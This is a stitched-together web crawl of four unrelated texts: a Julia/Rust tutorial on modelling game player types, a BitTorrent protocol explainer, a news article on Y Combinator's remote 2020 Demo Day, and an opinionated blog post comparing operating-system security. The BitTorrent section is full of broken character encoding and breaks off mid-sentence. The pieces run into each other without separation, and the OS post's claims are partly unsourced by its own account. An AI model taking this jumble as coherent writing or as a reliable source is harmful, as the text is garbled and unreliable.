<p>Suppose, you are creating an intergalactic game where players can inhabit three different star systems: Our sun (the <em>solarians</em>), the polar star (the <em>polarians</em>) and Alpha Centauri (the <em>centaurians</em>).
An obvious first step would be to define types for each of these three classes:</p>
<p>In Julia:</p>
<div><pre><code data-lang="julia"><span>struct</span> Solarian <span>end</span>
<span>struct</span> Polarian <span>end</span>
<span>struct</span> Centaurian <span>end</span>
</code></pre></div><p>and in Rust (I will stick to this order if not stated otherwise):</p>
<div><pre><code data-lang="rust"><span>struct</span> <span>Solarian</span>;
<span>struct</span> <span>Polarian</span>;
<span>struct</span> <span>Centaurian</span>;
</code></pre></div><p>(You would add some fields to those structs, of course, but that’s not the point here.)</p>
<p>Now, let’s say you need to store the player value in another object like a game state:</p>
<div><pre><code data-lang="julia"><span>struct</span> GameState
    daytime<span>::</span><span>UInt</span>
    player<span>::???</span>
<span>end</span>
</code></pre></div><div><pre><code data-lang="rust"><span>struct</span> <span>GameState</span> {
    daytime: <span>u64</span>,
    player: <span>???</span>
}
</code></pre></div><p>What type would you use for <code>player</code> in each case?
And what about</p>
<div><pre><code data-lang="julia"><span>function</span> homestar(player<span>::???</span>)<span>::</span>String
    <span>...</span>
<span>end</span>
</code></pre></div><div><pre><code data-lang="rust"><span>fn</span> <span>homestar</span>(player: <span>???</span>) -&gt; <span>String</span> {
    ...
}
</code></pre></div><p>These are the questions we’re here for.</p>
<h2 id="strategy-1-inheritance--subtyping">Strategy 1: Inheritance / subtyping</h2>
<h3 id="julia">Julia</h3>
<p>This is very straightforward in Julia.
Define</p>
<p>and make the structs from above subtypes of that:</p>
<div><pre><code data-lang="julia"><span>struct</span> Solarian <span>&lt;:</span> Player <span>end</span>
<span>struct</span> Polarian <span>&lt;:</span> Player <span>end</span>
<span>struct</span> Centaurian <span>&lt;:</span> Player <span>end</span>
</code></pre></div><p>Dynamic dispatch then allows you to write:</p>
<div><pre><code data-lang="julia">homestar(player<span>::</span>Solarian) <span>=</span> <span>"sun"</span>
homestar(player<span>::</span>Polarian) <span>=</span> <span>"polar star"</span>
homestar(player<span>::</span>Centaurian) <span>=</span> <span>"Alpha Centauri"</span>
homestar(player<span>::</span>Player) <span>=</span> <span>"unknown"</span> <span># or `error("Unknown player class")`</span>
</code></pre></div><h3 id="rust">Rust</h3>
<p>Rust does not have subtyping but you can define relations between types via <em>traits</em> (similar to interfaces in other languages).
So, we can try</p>
<div><pre><code data-lang="rust"><span>trait</span> Player {
    <span>fn</span> <span>homestar</span>(<span>&amp;</span>self) -&gt; <span>String</span>;
}
</code></pre></div><p>and then</p>
<div><pre><code data-lang="rust"><span>impl</span> Player <span>for</span> Solarian {
    <span>fn</span> <span>homestar</span>(<span>&amp;</span>self) -&gt; <span>String</span> {
        <span>String</span>::from(<span>"sun"</span>)
    }
}
</code></pre></div><p>But what about the <code>GameState</code> struct?
We can make use of <em>trait objects</em>, about which we only know that they implement a certain trait.
We especially don’t know the object’s size so we need to reference to it.
If you’re familiar with Rust, you know that this either means using a “normal” reference (<code>&amp;</code> or <code>&amp;mut</code>) and dealing with life time annotations (not my favourite, to be honest) or using a <code>Box</code>ed value.
If you’re not familiar with that, it doesn’t really matter here anyway.
<code>GameState</code> could look like this:</p>
<div><pre><code data-lang="rust"><span>struct</span> <span>GameState</span> {
    daytime: <span>u64</span>,
    player: <span>Box</span><span>&lt;</span>dyn Player<span>&gt;</span>
}
</code></pre></div><p>This works, but does restrict us in what we can do with the <code>Player</code> trait, as it needs to be <a href="https://doc.rust-lang.org/reference/items/traits.html#object-safety"><em>object safe</em></a>.
For example, greeting another player of an arbitrary class</p>
<div><pre><code data-lang="rust"><span>trait</span> Player {
    <span>fn</span> <span>homestar</span>(<span>&amp;</span>self) -&gt; <span>String</span>;
    <span>fn</span> <span>greet</span><span>&lt;</span>T: <span>Player</span><span>&gt;</span>(<span>&amp;</span>self, other: <span>&amp;</span><span>T</span>);
}
</code></pre></div><p>would not work anymore.</p>
<p>This would be easy in Julia, though:</p>
<div><pre><code data-lang="julia">greet(self<span>::</span>Polarian, other<span>::</span>Player) <span>=</span> println(<span>"Hi!"</span>)
greet(self<span>::</span>Polarian, other<span>::</span>Solarian) <span>=</span> println(<span>"Your star doesn't even consist of three separate stars? Pathetic!"</span>)
</code></pre></div><h2 id="strategy-1b-constrained-generics">Strategy 1b: Constrained generics</h2>
<p>Both Julia and Rust offer defining generic types with type parameters.
Additionally, one can put constraints on those parameters.
This allows us to do a smiliar thing as in strategy 1 but without hiding the concrete player type in the <code>GameState</code> struct:</p>
<div><pre><code data-lang="julia"><span>abstract type</span> Player <span>end</span>
<span>struct</span> Solarian <span>&lt;:</span> Player <span>end</span>

<span>struct</span> GameState{P <span>&lt;:</span> Player}
    daytime<span>::</span><span>UInt</span>
    player<span>::</span>P
<span>end</span>
</code></pre></div><p>or</p>
<div><pre><code data-lang="rust"><span>trait</span> Player { ... }
<span>struct</span> <span>Solarian</span>;
<span>impl</span> Player <span>for</span> Solarian { ... }

<span>struct</span> <span>GameState</span><span>&lt;</span>P: <span>Player</span><span>&gt;</span> {
    daytime: <span>u64</span>,
    player: <span>P</span>
}
</code></pre></div><p>This approach can be considered more performant in general, as the compiler can emit code for concrete types (<a href="https://doc.rust-lang.org/book/ch10-01-syntax.html#performance-of-code-using-generics"><em>monomorphisation</em></a>) instead of carrying around a clumsy super type that keeps track of subtypes and <a href="https://en.wikipedia.org/wiki/Virtual_method_table">virtual method tables</a>.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></p>
<p>However, there is a major concern with this approach: <strong>abstraction leaking</strong>.
Users of the <code>GameState</code> struct now have to decide what concrete type to choose for the parameter <code>P</code>, very strictly so in Rust, not so much in Julia.
This can be okay, but often enough <code>GameState</code> is the right place to deal with that question and really should hide that detail.</p>
<p>So as a rule of thumb: Consider generics for this problem “deep down” in your code but don’t miss the abstraction level where it needs to be kept inside.</p>
<h2 id="strategy-2-enumerations">Strategy 2: Enumerations</h2>
<p>So far, the approaches were not really satisfying for Rust.
But enumerations come to the rescue!
Enumerations (or enums) are types that consist of a concrete and explicit list of possible values (so called <em>variants</em>).</p>
<h3 id="rust-1">Rust</h3>
<p>In Rust, those values can even have their own data which is perfect for our situation:</p>
<div><pre><code data-lang="rust"><span>enum</span> <span>PlayerClass</span> {
    Sol(Solarian),
    Pol(Polarian),
    Cent(Centaurian)
}

<span>struct</span> <span>GameState</span> {
    daytime: <span>u64</span>,
    player: <span>PlayerClass</span>
}

<span>impl</span> PlayerClass {
    <span>fn</span> <span>homestar</span>(<span>&amp;</span>self) -&gt; <span>String</span> {
        <span>use</span> PlayerClass::<span>*</span>;
        <span>match</span> self {
            Sol(_) <span>=&gt;</span> <span>String</span>::from(<span>"sun"</span>),
            ...
        }
    }

    <span>fn</span> <span>greet</span>(<span>&amp;</span>self, other: <span>&amp;</span><span>PlayerClass</span>) {
        <span>use</span> PlayerClass::<span>*</span>;
        <span>match</span> (self, other) {
            (Cent(_), Pol(_)) <span>=&gt;</span> println<span>!</span>(<span>"Hello, fellow three-star-systemer!"</span>),
            ...
        };
    }
}
</code></pre></div><p>This indeed solves all our previous problems and is hence the go-to pattern for this situation.</p>
<h3 id="julia-1">Julia</h3>
<p>Julia does technically have enums, but not really.</p>
<div><pre><code data-lang="julia">@enum PlayerClass Sol Pol Cent
</code></pre></div><p>exists and it will give you a type <code>PlayerClass</code> with exactly these three possible values but enums are not a first class citizen.<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>
But that’s not even relevant for us, more importantly, enum variants in Julia are <em>not</em> able to carry additional data with them!
So all the information in the fields of the <code>Solarian</code>, <code>Polarian</code>, and <code>Centaurian</code> struct can not be build into the <code>PlayerClass</code> enum.
There is no way to sensibly implement</p>
<div><pre><code data-lang="julia"><span>function</span> takedamage!(player<span>::</span>PlayerClass)
    <span>...</span>
<span>end</span>
</code></pre></div><p>whereas it is trivial in Rust:</p>
<div><pre><code data-lang="rust"><span>impl</span> PlayerClass {
    <span>fn</span> <span>takedamage</span>(<span>&amp;</span><span>mut</span> self) {
        <span>match</span> <span>&amp;</span><span>mut</span> self {
            PlayerClass::Sol(solarian) <span>=&gt;</span> solarian.health <span>-=</span> <span>42</span>,
            ...
        };
    }
}
</code></pre></div><p>assuming the struct <code>Solarian</code> has a field <code>health: u64</code>.</p>
<h2 id="conclusion">Conclusion</h2>
<p>You might have guessed it by now, but the general advice is:
<strong>Use subtyping in Julia and enums in Rust.</strong>
One caveat though: Enums can not be extended from the “outside”.
If you plan to let users of your library add new type variants, you will have to use some kind of trait approach.</p>
<p>If you are somewhat familiar with Rust or Julia then a large part of this article is probably very obvious to you.
“Of course I use subtyping, that’s what everybody <em>loves</em> Julia for!” or “Of course I use enums, they’re one of <em>the</em> key features of Rust!” you might say.</p>
<p>However, I find it quite surprising that these two – seemingly rather different – patterns can be used in the same situation.
If you are (without loss of generality) a Julia developer, being aware of the corresponding pattern in Rust might help you design appropriate types faster, should you ever get into that situation; and vice versa.</p>

<p>30 Aug 2020</p>

<p>The decentralized nature of the Internet and the ability to self-host content has always been appealing to me.</p>

<p>Iâ€™m really interested in taking problems and re-working them so that they can be solved without an obvious single point of failure instead of requiring a single central coordinating actor. This can be accomplished using <a href="https://en.wikipedia.org/wiki/Peer-to-peer">peer-to-peer</a> networking â€” instead of connecting to a single server, one would connect with multiple other peers on their network. Coincidentally, I also enjoy collecting data. Thus, the <strong><a href="https://en.wikipedia.org/wiki/BitTorrent">BitTorrent protocol</a></strong> is particularly interesting to me. For this post, I thought I would walk through a conceptual example to help de-mystify how the protocol works.</p>

<p>Upfront warning: there will be a decent amount of hand-waving around the actual networking component of the protocol, since I believe it would just bog down this post (and, realistically, Iâ€™d make a fool of myself).</p>

<h3 id="setting-the-scene">Setting the Scene</h3>

<p>We just finished running an event. Awesome. Maybe it was a conference, an unconference, or somewhere in the middle. It went well and weâ€™re feeling real proud of ourselves. This was also the first year we had talk transcripts as well as a professional photographer. We want to share this content with our organizers! Thereâ€™s one issue thoughâ€¦ the organizers are located all over the world!</p>

<p>Thereâ€™s plenty of options here â€” you could share a SomeCorpCloudServiceâ„¢ Folderâ€¦ maybe run an FTP serverâ€¦ what about physically mailing USB sticks to everyone? All very plausible options. But youâ€™re hesitating. That sounds like a lot of work for you, whether it be paying money for the storage, making sure a device stays plugged in 24/7, or licking tons of envelopes.</p>

<p>What if there was a way your organizers could help forward along the content to other organizers? Maybe some kind of organizer-to-organizer protocolâ€¦ ðŸ¤”</p>

<h3 id="a-first-attempt">A First Attempt</h3>

<p>Letâ€™s think of what we have here:</p>

<ul>
  <li>A pre-defined list of files we want to share.</li>
  <li>A list of clients (ie. organizers, IP addressesâ€¦ basically the same thing) we want to share these files with. This is called a <strong>swarm</strong>.</li>
</ul>

<p>So we develop a simple application. The application will keep track of which files youâ€™ve already downloaded and which ones youâ€™re missing. Itâ€™ll connect you to the swarm and open up individual connections to each person. This might be the entire swarm, or it could be just a few people.</p>

<p>These connections then support the following operations:</p>

<ol>
  <li>We can announce to the entire swarm which files we have already downloaded. We would do this when we first connect to the swarm, when others connect to the swarm, or when our set of downloaded files changes.</li>
  <li>We can connect to a specific client to send or receive a file.</li>
</ol>

<p>The process of sharing works by having a client <em>A</em> check which files it is missing, waiting for another client (<em>B</em>) to announce it has the file, and then communicating with client <em>B</em> to receive the file. Then client <em>A</em> would announce that it now has this file for anyone else who might need it. This lets content propagate through our swarm without always needing to get the files from the same person! That way we are not stuck content-less just because client <em>B</em> decided to go to bed early.</p>

<p>But there seems to be a problem here. Someone needs to provide the content initially, otherwise everyone will just be constantly announcing that they have no files. This is called the <strong>initial seed</strong>.</p>

<p>How would this work in practice? Suppose we have four clients involved and we need to share <code>IMG_3051.jpg</code>. Initially thereâ€™s only three clients in the swarm and none of them have the image. But in the shadows there lurks a mythical fourth client who has yet to connect and who has the image.</p>

<p><img src="https://dominic.cr/assets/images/file-share/scene1.svg" alt="Image showing a swarm of three clients missing the file, with a disconnected fourth client possessing the file" width="300px"></p>

<p>When the client connects, it tells everyone which files it has.</p>

<p><img src="https://dominic.cr/assets/images/file-share/scene2.svg" alt="The fourth client joins the swarm announcing it has the image file." width="300px"></p>

<p>And now things start moving! One of our clients has a fast internet connection, hears this message, realizes â€œhey I need that!â€� and asks for the file. The send completes!</p>

<p><img src="https://dominic.cr/assets/images/file-share/scene3.svg" alt="A send occurs for the file and now a second client has the file." width="300px"></p>

<p>Now that it has the file, this client decides to re-announce what it has.</p>

<p><img src="https://dominic.cr/assets/images/file-share/scene4.svg" alt="Two clients are now announcing they have the file." width="300px"></p>

<p>Time continues flowing. Our remaining clients have now heard both announcements and can receive the file from either client. The <strong>initial seed</strong> could now leave without leaving clients to dry.</p>

<p><img src="https://dominic.cr/assets/images/file-share/scene5.svg" alt="Everyone now has the files, with sends being issued from each client." width="300px"></p>

<p>With this application, we can now share our content peer-to-peer without needing to remain connected the entire time! Others can take up part of the sharing work.</p>

<h3 id="big-files-slow-connections">Big Files, Slow Connections</h3>

<p>The application is working well! Our organizers are slowly getting all of the generated media. Key word being <em>slowly</em>. Youâ€™ve gotten a few reports now that users will occasionally get stuck waiting ages for some of the larger files (RAW images are quite large after all). Not everyone in our swarm has fast internet connections, so the experience can be sub-optimal if you end up requesting a small file from a fast client and a large file from a slow client.</p>

<p>Your first guess here might be to always prioritize selecting the fastest client in the swarm. That sounds reasonableâ€¦ until they get bombarded with requests. Their home connection slows to a crawl. Eventually, they figure out that Netflix is streaming at awful quality due to the application and decide to close it â€” right as someone had downloaded exactly 99% of the image, leaving them unhappy.</p>

<p>A light bulb goes off in your head: <strong>why not split up our files into smaller pieces</strong>? This kills two birds with one stone! It minimizes the impact of slow connectionsâ€¦ downloading 100Kb from a slow connection is less painful than trying to download 100Mb. It also helps avoid re-downloading! If you are on a slow internet connection and already have 99% of a file downloaded and the connection drops all you need to do is download the missing piece instead of re-downloading the entire file.</p>

<p>So itâ€™s time to tweak our application â€” version 2.0.</p>

<p>Your application now conceptually splits up each file into <strong>pieces</strong>. Each piece has the same size. The protocol now uses the following operations:</p>

<ol>
  <li>We can tell the entire swarm which <strong>pieces</strong> we have already downloaded.</li>
  <li>We can send/receive a <strong>piece</strong> for a given connection.</li>
</ol>

<p>Picking the piece size actually has an important trade off. As piece size decreases, there are more announces and more file send/receive connections. If your piece size is too low (or too high!), the protocol loses efficiency.</p>

<h3 id="growing-the-swarm">Growing the Swarm</h3>

<p>Initially, we embedded a list of possible clients in our application. This isnâ€™t the most practical: IP addresses change, organizing teams grow, people want to download the file from multiple devices, etc.</p>

<p>We could develop a centralized <strong>tracker</strong> of peers. This service is responsible for tracking the IP addresses of swarm members, and for providing that list to clients. Our application would register with the tracker on startup and query for available peers. The tracker could periodically send out updates as the swarm changes to keep clients up to date.</p>

<p>This seems less than ideal given our initial goal of offloading as much work as possible and not needing to host anything. Feeling inspired from the peer-to-peer nature of the protocol up to this point, you might get curious and wonder if thereâ€™s a way to exchange swarm information peer-to-peer as well. In the real world, <a href="https://en.wikipedia.org/wiki/Distributed_hash_table">distributed hash tables</a> are generally used to accomplish this (eg. the BitTorrent protocol uses the <a href="https://en.wikipedia.org/wiki/Kademlia">Kademlia</a> system). These approaches all generally require some clients which are always online to bootstrap the search for swarm members, but it provides a way to de-centralize and distribute this work.</p>

<h3 id="do-you-trust-me">Do You Trust Me?</h3>

<p>Up till this point, weâ€™ve trusted all the members of our swarm to send the same files as the <strong>initial seed</strong>. But what if a malicious organizer decides to modify one of the images to make a meme and spreads it masquerading as the original? Alternatively, what if someoneâ€™s connection is flaky and weâ€™re not quite sure we got the right bytes for the image?</p>

<p>Weâ€™ve discussed a similar problem in the past when <a href="https://dominic.cr/2020/05/26/merkle_trees/">Verifying Data with Merkle Trees</a>. The core of solving that problem involved using a <a href="https://en.wikipedia.org/wiki/Checksum">checksum function</a> on our data and sharing the checksum so that others could verify they had the data we intended.</p>

<p>So we decide to try <strong>embedding a checksum with each file piece</strong> in our application alongside our file piece information. Our application can then verify that any piece received from another client matches the checksum! We can now add untrusted members to the swarm without worrying that they might tamper our file data!</p>

<h3 id="what-about-next-year">What About Next Year?</h3>

<p>Weâ€™ve now established a good conceptual protocol for sharing this type of content. But one part of it is still impractical: so much information is baked directly into the application! Organizers really like the application and would like to use it for other events.</p>

<p>The information we needed to coordinate this dance of file-sharing includes:</p>

<ul>
  <li>The list of file pieces and their checksums.</li>
  <li>Any information we need to find other swarm members. As an example, this could be the URL for our tracker!</li>
</ul>

<p>If we were to put this information in a file and modify our application to accept these files, we could now re-use the protocol arbitrarily! This means our application could download and share multiple sources at once.</p>

<p>It turns out that this is exactly what a <code>.torrent</code> file contains (along with other data). These files are encoded using the <a href="https://en.wikipedia.org/wiki/Bencode">Bencode</a> format in order to allow flexibility and offer some size reduction. Everything youâ€™ve read in this post is actually used in the BitTorrent protocol: the process itself, file pieces, checksumming, and trackers (or trackerless via distributed hash tables). Our application is the equivalent to a BitTorrent client!</p>

<p><strong>Well done - we over-engineered a simple file-sharing problem and built BitTorrent from scratch.</strong> ðŸŽ‰</p>

<h3 id="aside-encouraging-good-behavior">Aside: Encouraging Good Behavior</h3>

<p>We didnâ€™t really cover a) how to select which clients we interact with and b) how to select which file pieces to get first, but these are both …</p></article></div></div>

<p>Minutes before Nitthin Chandran was set to present his startup to a powerful group of foreign investors, the power went out in his apartment in Bangalore. The timing couldn’t have been worse: power outages are par for the course in the city, where Chandran was presenting remotely via Zoom, but there was life-changing money on the line.&nbsp;</p>



<p>Chandran, the founder of <a href="https://www.medpiper.com/">MedPiper Technologies</a>, was pitching his Indian hospital-staffing startup for this year’s Demo Day. The two-day event is the culmination of Silicon Valley’s most well-known startup accelerator program, Y Combinator; <a href="https://techcrunch.com/2019/10/02/these-are-the-top-y-combinator-companies-of-all-time-based-on-valuation/">notable program graduates</a> include Airbnb, Stripe, and DoorDash.&nbsp;</p>



<p>The stakes were high, so Chandran came prepared: his Y Combinator–appointed mentor had advised him to upgrade his internet speed and<strong> </strong>make ready multiple backup options for situations just like this one. Saved by a spare dongle he’d bought on sale at his local market, Chandran delivered his one-minute pitch to an unseen audience of high-powered investors and thousands of viewers, all from his apartment in Bangalore.&nbsp;</p>



<p>In spite of the blackout, Chandran kept his cool: “We practiced maybe 100 times before Demo Day.”</p>



<p>For the first time in its 15-year history, <a href="https://techcrunch.com/2020/04/20/y-combinator-officially-shifts-its-next-accelerator-class-to-fully-remote-format/">Y Combinator went fully remote</a> with its famed startup accelerator program. With the coronavirus pandemic making travel and in-person meetings nearly impossible, everything from workshops to the all-important Demo Day went online. The remote experience may have flattened the in-person interactions that drive some of the tech industry’s biggest deals. But founders from non-Western markets say that attending Y Combinator remotely didn’t hinder their success — in fact, it helped. Internet connectivity issues aside, foreign founders say the first fully remote Y Combinator has put these companies on a more equal footing with their American counterparts.</p>

<p>In pre-pandemic times, founders accepted to Y Combinator were flown to San Francisco, where they spent three months developing their startups <a href="https://www.bizjournals.com/sanjose/news/2019/02/12/y-combinator-demo-days-2019-san-francisco.html">before presenting to funders at Demo Day</a>. For non-American founders with operations outside the United States, this often meant spending a full financial quarter away from their teams and home markets to attend workshops and networking events.&nbsp;</p>



<p>“You talk to other international founders, and they’re like, Oh yeah, I spent most of YC on a plane,” said Iain Usiri, a Tanzanian founder whose startup <a href="https://www.ramani.io/">Ramani</a> presented at last week’s Demo Day. By going remote, “The biggest logistical problem is solved,” he said. “You’re on par with a U.S. founder who is in his home market.”</p>



<p>Under normal circumstances, Usiri might’ve fretted over his outfit choice or physical gestures on Demo Day. “Personally, I do well on a stage,” he said. But this time, he and other founders in his class invested in backup internet, high-quality microphones, and new lighting, to ensure their Zoom presentations go as smoothly as possible. A remote presentation has its own anxieties: Usiri said he was so paranoid about power outages in his home in Tanzania, he had nightmares about it leading up to Demo Day. Nicolás López, co-founder of Justo, <a href="https://www.getjusto.com/">a Chilean food-delivery startup</a>, said he worried about competing with social media notifications and emails that might be popping up on investors’ screens during their demo.&nbsp;</p>



<p>But logging onto Y Combinator from the comfort of their home markets meant founders could maintain their startups while benefiting from Y Combinator’s coveted mentorships. “Between when we applied for Y Combinator in March and today, we grew our team from 10 to 95,” said López. “I don’t think we would have been able to do that if we had been in Palo Alto for the past three months.”</p>



<p>In Bangalore, MedPiper’s Chandran, who is building a database of verified doctors and nurses in India, was able to take in-person meetings during the period. He said he signed up to 40,000 medical professionals during his time with Y Combinator. “We don’t think we would have done even 60 to 70% of the sales which we were able to close [had we been away],” Chandran told <em>Rest of World.</em> “All these sales were done in person, walking into hospitals.”&nbsp;</p>



<p>Paradoxically, the remote nature of this year’s Y Combinator meant more face time between founders and partners. “I was asking for office hours all the time, sometimes three meetings a week with partners,” Arthur Alvarenga, founder of Brazilian startup <a href="https://chatpay.com.br/">ChatPay</a> said. “Everyone was very available, and with Zoom, things moved faster. You could get on a call faster than going to campus to meet with them if we were in person.”</p>

<p>Crucially, the pandemic has forced investors to consider any and all investments remotely; it’s leveled the playing field. Alvarenga, based in Brazil, might’ve missed out on chances for in-person meetings. But on Zoom, he’s just as remote as a founder in Boston. Both current and former non-Western Y Combinator participants said that funders are now more willing to take meetings and close deals over Zoom, where they once might have required an in-person meeting. Foreign founders in this batch of Demo Day presenters said they walked away from the event with more than 100 interested investors — far more than they could muster in their local markets.</p>



<p>Thomas Hellman, professor of entrepreneurship and innovation at Oxford’s Saïd Business School, said that the remote nature of today’s business environment has changed investor behavior, perhaps to the benefit of non-American founders.<strong> </strong>“Investors who said they would never invest unless they met a person have now written checks to entrepreneurs without meeting them,” he said.&nbsp;</p>



<p>But a willingness to close deals over Zoom hasn’t changed some of the inherent challenges in raising money as a foreign startup. U.S.-based companies still constitute the majority of the Y Combinator batch: 39 of the <a href="https://techcrunch.com/2020/08/24/here-are-the-98-companies-from-y-combinators-summer-2020-demo-day-1/">197 startups participated</a> from Asia, Africa, and Latin America. Hellman said that, in lieu of organic meetings and face-to-face interactions, venture capital firms are likely to rely on their own referral networks, which he said are essentially frozen during the pandemic. “The biggest thing to look out for is how networks are going to retrench,” he said. “That could lead to more privileged entrepreneurs having access to capital.”&nbsp;&nbsp;</p>



<p>Despite a more remote-friendly environment, Hellmann said foreign startups <a href="https://techcrunch.com/2014/04/22/foreign-startup-founders-face-unique-struggles-to-break-funding-barrier/">still face higher barriers to raising funds</a>. Local companies may still have an advantage, even if it’s a smaller one. “Just because Zoom is making this more democratized, it doesn’t change the fact that some investors are just not going to understand your market or want to invest outside the United States,” said Alvarenga. “And that’s a root problem.”</p>



<p>But for the half a dozen founders from this summer’s batch of presenters who spoke with <em>Rest of World, </em>internet outages and Zoom presentations were minor inconveniences compared to their otherwise positive Y Combinator experiences.&nbsp;</p>



<p>“The real value of YC is the network,” said Alvarenga. “The more quality people you put in, the better the network becomes.”</p>

        <b><time datetime="2020-08-20 23:14:10+0200">2020-08-20 23:14:10 +0200</time></b>
        <p>This is going to be a rather long post, and I cannot add sources for everything right away. I may add sources at any time 
without a notice (my edit policy still applies for other kinds of edits nevertheless). Note that for some things I might 
never be able to provide sources as these are simply things I heard about in public chatrooms.</p>
<p>As you may know, I am in the <a href="https://matrix.to/#/#os-security:fantasycookie17.onederfultech.com">OS Security room on Matrix</a>, 
in which various operating systems are discussed frequently regarding their security. The thing is, it is not that simple, 
as many that have reached widespread use today are much less secure than you would expect (while others which are also widely 
used are <em>more</em> secure than you might think, if not as secure as expected), and those that are secure basically always have 
some other kinds of drawbacks that are not directly related to security, but may be a dealbreaker nevertheless. I will mainly 
focus on desktop and mobile operating systems here, as servers have a very different quantity and quality of attack surface, 
and security should rather be provided by the often well-written, less complex server software, and isolation is done through 
hypervisors anyway, most of the time, as things like clipboard and file sharing are not that important.</p>
<h2>Some basic terms</h2>
<p>It might occur to you that you are not familiar with some of the terms used here. However, I do not know how I could be 
better at explaining them than Wikipedia is (doing so nevertheless seems redundant), so I decided to just link their 
respective pages for you here. (Note: I would normally not explain many of these if they were used in a shorter blogpost 
without all the others, however, the sheer amount of terminology made me deem it appropriate to explain all of them.)</p>

<li>Verified boot: I will actually explain this one myself, because Wikipedia did not appear to have a good definition. Verified boot allows the boot firmware to prevent bootloaders and kernels that do not have a valid cryptographic signature that corresponds to some specified public key to be loaded. These are then supposed to verify the userland, effectively preventing persistent exploits. Now, there has been some criticism, because many devices only allow particular keys, however, good implementations allow you to unlock them, specify your own keys, and then relock them, meaning user freedom is not impacted by this.</li>

<li><a href="https://en.wikipedia.org/wiki/Virtual_machine">Virtual Machine (VM)</a></li>
</ul>
<h2>Linux (or GNU/Linux)</h2>
<p>I do not even know where to start here. Linux distros offer easy to use, fast and versatile OSes, however, the security is 
very lacking.</p>
<h3>Sandboxing</h3>
<p>Linux systems by default have no sandboxing of applications at all, meaning a compromise of one app easily leads to full 
system compromise. Now, there are two "solutions" to this: The app distribution systems Snap and Flatpak. Flatpak, however, 
<a href="https://flatkill.org/">has some quite severe issues with its sandbox</a>, and while I cannot state similar things about Snap, I 
have been told it was not much better, and it has its own set of issues, such as only allowing a single, proprietary app store.</p>
<h3>General hardening and memory safety</h3>
<p>The Linux kernel does not incorporate modern hardening techniques such as CFI, it is a monolithic kernel (which makes 
applying the principle of least privilege basically impossible), it is written in non-memory safe languages (mainly C), and 
the situation for desktop programs does not look that much better.</p>
<h3>GUI stack</h3>
<p><ins>Update: I meant the most commonly used GUI stack. Of course, there is no "default", since GNOME, as well as Wayland 
compositors and Lomiri, default to Wayland or Mir, respectively.</ins></p>
<p>The default GUI stack is X11, which has been said to be rather insecure, even by the developers themselves, as it allows any 
program to view and manipulate input and output from any other program. While Wayland is said to be more secure, <a href="https://github.com/Aishou/wayland-keylogger">keylogging 
through <code>/proc</code> is still possible</a>.</p>
<p><ins>Update: The mentioned exploit does not use <code>/proc</code>.</ins></p>
<h3>But I always thought Linux was super safe and had almost no bugs?</h3>
<p>The kernel alone contains million lines of code. <a href="https://syzkaller.appspot.com/upstream">Syzbot, a bot used for testing Linux and other kernels finds plenty bugs 
every month, and many of them are not fixed</a>.</p>
<h3>Hardened Linux distros</h3>
<p><ins>Update: As mentioned above, the Wayland keylogger relies on the <code>LD_PRELOAD</code> environment variable, meaning properly 
sandboxed applications may not be able to exploit it. However, the issues with the kernel (which does the majority of the 
sandboxing itself through the namespaces feature), as well as the applications themselves remain.</ins></p>
<p>Actually hardened Linux distros like <a href="https://whonix.org/">Whonix</a> or <a href="https://clip-os.org/en/">CLIP OS</a> do provide better 
security, however they come or will come with restrictions like restricted root or not being able to make files executable 
that were not installed by the package manager, or running any app outside of a restrictive sandbox, due to their use of 
restrictive MAC policies. I also consider it likely that none of them can fix the architectural issues with the kernel and 
GUI stacks, as well as the fact most Linux programs are not designed to be run in a sandbox.</p>
<h2>Android</h2>
<p>Android is a Linux-based OS by Google that greatly improves on the security of the latter. All apps run in sandboxes confined 
from each other, it has strong SELinux policies, and several devices feature a full verified boot implementation, in the case of the 
Google Pixel line, it is especially good, as it is possible to use custom keys, as well as both unlocking and relocking the 
bootloader. Memory safe languages like Java and Kotlin are commonplace. It also partially fixes the issue with Linux being a 
monolithic kernel, as it often uses stub drivers in the kernel that actually rely on userspace drivers. Nevertheless, one 
should not overlook issues such as the way it has become a closed ecosystem, with many devices being non-repairable, the use 
of a a very specific, apparently hard to port API (as the fact the Anbox compatibility layer for Linux does not work that 
great shows), and the reliance of many apps on proprietary Google services (though, to be fair, this is less common in apps 
that are free and open source software). Another issue is that neither the apps nor the GUI are really desktop friendly; they 
remain focused on the use on small touchscreens. For security, GrapheneOS, which is based on Android, should be considered.</p>
<h2>ChromiumOS</h2>
<p>ChromiumOS is another OS by Google, based on Linux. Like Android, it uses SELinux policies, and offers isolation of 
desktop apps from the main operating system. However, there is one glaring issue with this: The central elemenet of the system, 
prominently featured in the name, and perhaps the one program with the largest attack surface; the web browser, is only 
isolated by its own sandbox as well as said SELinux policies, and not by the stronger isolation that their own KVM-based 
emulator crosvm offers, which is written in Rust and can thus be considered memory safe. It is also one of the worst 
operating systems for privacy due to <a href="https://www.chromium.org/chromium-os/chromiumos-design-docs/login">the way how login is handled</a>.</p>
<h2>BSD</h2>
<p>FreeBSD, OpenBSD, NetBSD, HardenedBSD and so on all promise secure operating systems. While they are probably not as bad as 
Linux, especially on servers, their security is still lacking, and they have no proper desktop security model at all, mainly 
because they use X11 for a GUI stack, and browsers that have sandboxes elsewhere are not sandboxed here. They still use 
memory unsafe languages and monolithic kernels. <a href="https://isopenbsdsecu.re/">Here</a> is some more information on OpenBSD 
specifically, which, while having improved security for various programs, and utilizing quite a bit more hardening than Linux, 
is not actually as secure as it claims, due to aforementioned issues.</p>
<h2>MacOS and iOS</h2>
<p>These are partially open source operating systems by Apple. They both have (locked-down) verified boot implementations, and 
both employ a certain degree of sandboxing for apps. There is not much to say, they are rather good, but the only devices where 
they properly run is Apple ones, which are known for rather bad value and low repairability. The security model, while okay, 
is not too interesting to be honest. Privacy-wise, they are fine if telemetry is disabled, especially considering the fact 
that both the Safari web browser and the sandbox try to minimize tracking that can be conducted by websites and apps, 
respectively.</p>
<h2>Windows</h2>
<p>The main reasons I see this operating system being liked by the security community include the Hyper-V hypervisor, which 
<a href="https://link.springer.com/chapter/10.1007/978-3-642-05089-3_51">apparently is supposed to be formally verified</a>, as well as 
Windows Defender Application Guard (WDAG), which is supposed to run the Microsoft Edge browser and other applications in a 
specialized VM. Microsoft store apps are also sandboxed, however they are… well, mostly stereotypical apps, and less actual, 
common desktop software. Issues with this one include it is slow, cannot be properly used with a GUI (not that you would want 
to anyway, given how much the Windows command line sucks compared to the one on POSIX/UNIX systems), highly targeted, proprietary, 
